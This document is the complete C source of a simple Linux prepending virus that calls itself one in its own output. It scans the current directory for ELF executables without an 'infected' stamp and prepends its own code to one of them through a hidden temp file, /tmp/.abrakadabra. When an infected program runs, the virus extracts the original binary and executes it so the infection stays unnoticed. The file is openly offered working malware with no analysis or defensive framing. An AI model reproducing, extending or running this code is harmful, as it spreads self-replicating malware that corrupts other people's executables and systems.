#include <elf.h>
#include <sys/sendfile.h>
#include <dirent.h>
#include <stdio.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>


#define TEMP_FILE "/tmp/.abrakadabra"
#define SIZE 18088


#if defined (__linux)
#  if defined(__x86_64)
    Elf64_Ehdr Elf_Ehdr;
#  elif defined(__i386)
    Elf32_Ehdr Elf_Ehdr;
#  endif    
#endif


bool if_infect_new_elfed(char *file_name) {
    FILE *fp = fopen(file_name, "r");
    unsigned long file_size;
    bool infect_new_elfed = true;
    char stamp[10] = {'i','n','f','e','c','t','e','d','\0'};
    fseek(fp, 0, SEEK_END);
    file_size = ftell(fp);
    fseek(fp, (file_size - 10), SEEK_SET);
    for(int i=0; i<10; i++){
        if(stamp[i] != fgetc(fp))
            infect_new_elfed = false;
    }
    fclose(fp);
    return infect_new_elfed;
}



bool is_valid_elf(char *file_name) {

    FILE *fp = fopen(file_name, "rb");

    fread(&Elf_Ehdr, sizeof(char), sizeof(Elf_Ehdr), fp);

    if(Elf_Ehdr.e_ident[EI_MAG0] == ELFMAG0 && Elf_Ehdr.e_ident[EI_MAG1] == ELFMAG1 && Elf_Ehdr.e_ident[EI_MAG2] == ELFMAG2 && Elf_Ehdr.e_ident[EI_MAG3] == ELFMAG3)
        return true;
    else 
        return false;
    fclose(fp);
}



void infect_new_elf(char* file, int fd) {
    int fd_actual = open(file, O_RDONLY); 
    struct stat st;
    fstat(fd_actual, &st);
    int original_size = st.st_size;

    char stamp[10] = {'i','n','f','e','c','t','e','d','\0'};
    
    int fd_temp = creat(TEMP_FILE, st.st_mode); 
    sendfile(fd_temp, fd, NULL, SIZE);
    sendfile(fd_temp, fd_actual, NULL, original_size);
    for (int i=0; i<10; i++){
        write(fd_temp, &stamp[i], sizeof(char));
    }

    rename(TEMP_FILE, file);

    close(fd_temp);
    close(fd_actual);
}





void execute_actual_elf(int fd, mode_t mode, int actual_size, char *argv[]) {
    int fd_temp = creat(TEMP_FILE, mode);

    lseek(fd, SIZE, SEEK_SET);

    long size_of_file_to_execute = actual_size - SIZE - 10;
    sendfile(fd_temp, fd, NULL, size_of_file_to_execute);
    close(fd_temp);

    pid_t pid = fork();         
    if(pid == 0) {          
        execv(TEMP_FILE, argv);
    }
    else{                   
        waitpid(pid, NULL, 0);      
        unlink(TEMP_FILE);
    }
}




int main(int argc, char *argv[]) {

    fprintf(stdout,"Hello! I am a simple virus!\n");

    DIR *d;
    struct dirent *dir;
    struct stat st_main;
    stat(argv[0],&st_main);
    int main_fd = open(argv[0], O_RDONLY);
    d = opendir(".");
    if(d == NULL){
        exit(0);
    }
    while ((dir = readdir(d)) != NULL){
        struct stat st_loop;
        stat(dir->d_name,&st_loop);
        if ((st_main.st_ino == st_loop.st_ino) || (S_ISDIR(st_loop.st_mode)) || (st_loop.st_size == SIZE))
            continue;
        if (access(dir->d_name, R_OK) == 0 ){
            if(is_valid_elf(dir->d_name) && !if_infect_new_elfed(dir->d_name)){
                infect_new_elf(dir->d_name, main_fd);
                break;
            }
        }
    }
    if(st_main.st_size != SIZE){
       execute_actual_elf(main_fd, st_main.st_mode, st_main.st_size, argv);
    }
    close(main_fd);
    return(0);
}




